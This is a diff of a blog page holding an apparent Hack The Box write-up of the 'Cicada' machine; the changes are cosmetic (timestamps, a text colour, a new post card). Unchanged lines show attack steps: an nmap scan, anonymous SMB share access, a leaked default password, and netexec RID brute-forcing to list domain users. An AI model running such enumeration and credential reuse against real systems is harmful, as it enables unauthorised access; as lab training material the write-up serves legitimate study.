@@ -15,7 +15,7 @@
 <meta property="og:description" content="Table of Contents Initial Enumeration with Nmap Step 2: Enumeration of SMB Service Step 3: foothhold  Step 4: Privilege Escalation  In this write-up, we will walk through the steps to hack the Cicada">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-12-30T23:48:47.839Z">
-<meta property="article:modified_time" content="2024-12-31T02:52:54.699Z">
+<meta property="article:modified_time" content="2025-01-06T19:06:16.653Z">
 <meta property="article:author" content="NUTZH">
 <meta property="article:tag" content="HACKTHEBOX,CTF,SECURITY, NETWORK , PENTEST , WEBexploit , TRYHACKME , CHEATSHEET , LINUX , WINDOWS">
 <meta name="twitter:card" content="summary">
@@ -66,7 +66,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"0xdezznutz.github.io","author":"NUTZH","root":"/","typed_text":["Cybersecurity Student"],"theme_version":"2.2.4","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"favico.png","icon16":"favico.png","icon32":"favico.png","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"favico.png","show_text":"(/≧▽≦/)","hide_text":"(●—●)"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"","prefix":"The blog has been lovely to run undefined day"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-12-31 03:52:54"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-01-06 20:06:16"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.4" id="trm-switch-style">
@@ -412,7 +412,7 @@
 <h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.35 -T5 </span><br><span class="line">&gt; Nmap scan report <span class="keyword">for</span> cicada.htb (10.10.11.35)</span><br><span class="line">Host is up (0.056s latency).</span><br><span class="line">Not shown: 989 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2024-12-31 06:53:33Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br></pre></td></tr></table></figure>
 <h2 id="Step-2-Enumeration-of-SMB-Service"><a href="#Step-2-Enumeration-of-SMB-Service" class="headerlink" title="Step 2: Enumeration of SMB Service"></a>Step 2: Enumeration of SMB Service</h2><p>we got the port 445 open is for SMB :server mail block<br>let access to it</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient   //10.10.11.35/HR -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Mar 14 08:29:09 2024</span><br><span class="line">  ..                                  D        0  Thu Mar 14 08:21:29 2024</span><br><span class="line">  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024</span><br><span class="line"></span><br><span class="line">		4168447 blocks of size 4096. 61830 blocks available</span><br><span class="line">smb: \&gt; get <span class="string">&quot;Notice from HR.txt&quot;</span> </span><br><span class="line">getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
-<p>After reading the file <span style="color:yellow">“Notice from HR.txt”</span>, we obtained a password, but<br>we don’t know which user it belongs to.</p>
+<p>After reading the file <span style="color:green">“Notice from HR.txt”</span>, we obtained a password, but<br>we don’t know which user it belongs to.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dear new hire!</span><br><span class="line"></span><br><span class="line">Welcome to Cicada Corp! We<span class="string">&#x27;re thrilled to have you join our team. As part of our security protocols, it&#x27;</span>s essential that you change your default password to something unique and secure.</span><br><span class="line"></span><br><span class="line">Your default password is: Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8</span><br><span class="line"></span><br><span class="line">To change your password:</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
 <p>To find the user, we can use tools like netexec or crackmapexec:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.11.35 -u nutzh -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> --rid-brute </span><br><span class="line"> SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)</span><br></pre></td></tr></table></figure>
@@ -486,6 +486,41 @@
             <span data-number="02"></span>
         </h5>
     </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/administrator/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="https://t3.ftcdn.net/jpg/08/36/68/08/360_F_836680854_X6LcFKvNtUffX0JTFy9aGgKw8cOuN4lU.jpg">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/ACTIVE-MACHINE/">
+                    ACTIVE MACHINE
+                </a>
+            </div>
+            <h5>
+                <a href="/administrator/" class="trm-anima-link">
+                    ADMINISTRATOR
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/01/06</li>
+                <li>20:05</li>
+                
+                    <li>1.6k</li>
+                
+                
+                    <li>9</li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
     
     
         <div class="col-lg-6">
